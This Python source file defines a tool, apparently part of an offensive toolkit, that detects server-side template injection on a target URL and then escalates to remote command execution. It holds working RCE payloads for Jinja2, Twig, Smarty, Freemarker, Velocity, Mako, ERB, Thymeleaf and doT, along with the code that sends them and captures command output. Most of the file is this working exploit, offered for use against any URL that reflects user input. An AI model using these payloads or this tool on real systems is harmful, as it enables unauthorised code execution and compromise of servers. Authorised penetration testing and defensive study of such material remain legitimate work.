"""TOOL: ssti_rce - server-side template injection: fingerprint the engine,
then climb the RCE ladder with output markers. Engines: Jinja2, Twig, Smarty,
Freemarker, Velocity, Mako, ERB/EJS.
"""
from tools import register
from tools._exploit_lib import marker, paced_send, apply_template, verdict, extract_between

# probe -> engine hints (payload, what a hit looks like)
FINGERPRINTS = [
    ("{{7*7}}",            "49",      "jinja2/twig/smarty"),
    ("{{7*'7'}}",          "7777777", "jinja2"),
    ("${7*7}",             "49",      "freemarker/velocity/mako/smarty"),
    ("<%= 7*7 %>",         "49",      "erb"),
    ("#{7*7}",             "49",      "ruby"),
    ("{{= 7*7 }}",         "49",      "javascript-dot"),
    ("${{7*7}}",           "49",      "thymeleaf"),
]

# engine -> [(name, payload_template)] — {CMD} replaced, wrapped in markers
RCE_LADDERS = {
    "jinja2": [
        ("global-os-popen", "{{ cycler.__init__.__globals__.os.popen('echo {M1}; {CMD}; echo {M2}').read() }}"),
        ("config-globals",  "{{ config.__class__.__init__.__globals__['os'].popen('echo {M1}; {CMD}; echo {M2}').read() }}"),
    ],
    "twig": [
        ("filter-exec",  "{{ ['echo {M1}; {CMD}; echo {M2}']|filter('system') }}"),
        ("callback-env", "{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('echo {M1}; {CMD}; echo {M2}') }}"),
    ],
    "smarty": [
        ("system-tag", "{ system('echo {M1}; {CMD}; echo {M2}') }"),
    ],
    "freemarker": [
        ("execute-new", '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("echo {M1} && {CMD} && echo {M2}")}'),
    ],
    "velocity": [
        ("runtime-exec", '#set($x="echo {M1} && {CMD} && echo {M2}")##set($rt=$x.getClass().forName("java.lang.Runtime"))##set($ch=$rt.getRuntime().exec($x))##set($out=$ch.getInputStream())##foreach($i in [1..40])$out.read()#end'),
    ],
    "mako": [
        ("popen", "<%import os%>${os.popen('echo {M1}; {CMD}; echo {M2}').read()}"),
    ],
    "erb": [
        ("system", "<%= system('echo {M1}; {CMD}; echo {M2}') %>"),
        ("backtick", "<%= `echo {M1}; {CMD}; echo {M2}` %>"),
    ],
    "ruby": [
        ("eval-erb", "<%= eval('`echo {M1}; {CMD}; echo {M2}`') %>"),
    ],
    "thymeleaf": [
        ("springel", '__${T(java.lang.Runtime).getRuntime().exec(new String[]{"sh","-c","echo {M1}; {CMD}; echo {M2}"})}__'),
        ("springel-inline", '[[${T(java.lang.Runtime).getRuntime().exec(new String[]{"sh","-c","echo {M1}; {CMD}; echo {M2}"})}]]'),
    ],
    "javascript-dot": [
        ("process-exec", '{{= global.process.mainModule.require("child_process").execSync("echo {M1}; {CMD}; echo {M2}") }}'),
    ],
}

@register(name="ssti_detect_rce",
          desc="EXPLOIT: SSTI fingerprint ladder -> engine-confirmed RCE with command output. Feed any URL where user input is rendered back (reflections, previews, mail templates).",
          params={"type": "object", "properties": {
              "url_template": {"type": "string", "description": "URL with {INJ} placeholder where the template payload is reflected"},
              "cmd": {"type": "string", "default": "id"},
              "skip_rce": {"type": "boolean", "default": False, "description": "fingerprint only, do not fire RCE payloads"}},
              "required": ["url_template"]},
          danger="loud")
def ssti_detect_rce(url_template, cmd="id", skip_rce=False):
    if "{INJ}" not in url_template:
        return verdict("ssti_detect_rce", False, "url_template lacks {INJ} placeholder")

    engines = []
    # V4 (audit 2.1): "49" alone matches line-height:49px, prices 49.99,
    # any hash — the site was "confirmed SSTI" on pure page furniture.
    # A real hit needs the rendered value ABSENT from the probeless
    # baseline of the same URL.
    _st0, base_body, _dt0 = paced_send(apply_template(url_template, "vfprobe"))
    base_body = base_body or ""
    for probe, expect, hints in FINGERPRINTS:
        st, body, _dt = paced_send(apply_template(url_template, probe))
        body = body or ""
        if expect in body and probe not in body and expect not in base_body:
            engines.append({"engine": hints, "probe": probe, "rendered": expect})

    if not engines:
        return verdict("ssti_detect_rce", False,
                       "no template math rendered — likely no SSTI on this surface")

    # Pick the best matching engine that has RCE ladders
    best = None
    for e in engines:
        eng = e["engine"]
        for candidate in eng.split("/"):
            if candidate in RCE_LADDERS:
                best = candidate
                break
        if best:
            break
    if not best:
        best = engines[0]["engine"].split("/")[0]
    result = {"fingerprinted": engines, "primary_engine": best}
    if skip_rce:
        return verdict("ssti_detect_rce", "partial",
                       f"SSTI confirmed, engine={best} (RCE skipped by operator)",
                       **result)

    m1, m2 = marker(), marker()
    ladder = RCE_LADDERS.get(best, [])
    for name, template in ladder:
        pay = template.replace("{M1}", m1).replace("{M2}", m2).replace("{CMD}", cmd)
        st, body, dt = paced_send(apply_template(url_template, pay, quote_all=False))
        out = extract_between(body or "", m1, m2)
        if out is not None:
            result["rce_primitive"] = {"engine": best, "ladder_name": name,
                                       "status": st, "output": out[:900]}
            return verdict("ssti_detect_rce", True,
                           f"RCE CONFIRMED on {best} via {name} — output captured",
                           evidence=[f"{name}: {out[:200]}"], **result)
    return verdict("ssti_detect_rce", "partial",
                   f"SSTI confirmed ({best}) but RCE ladder blocked (sandboxed engine?)",
                   **result)
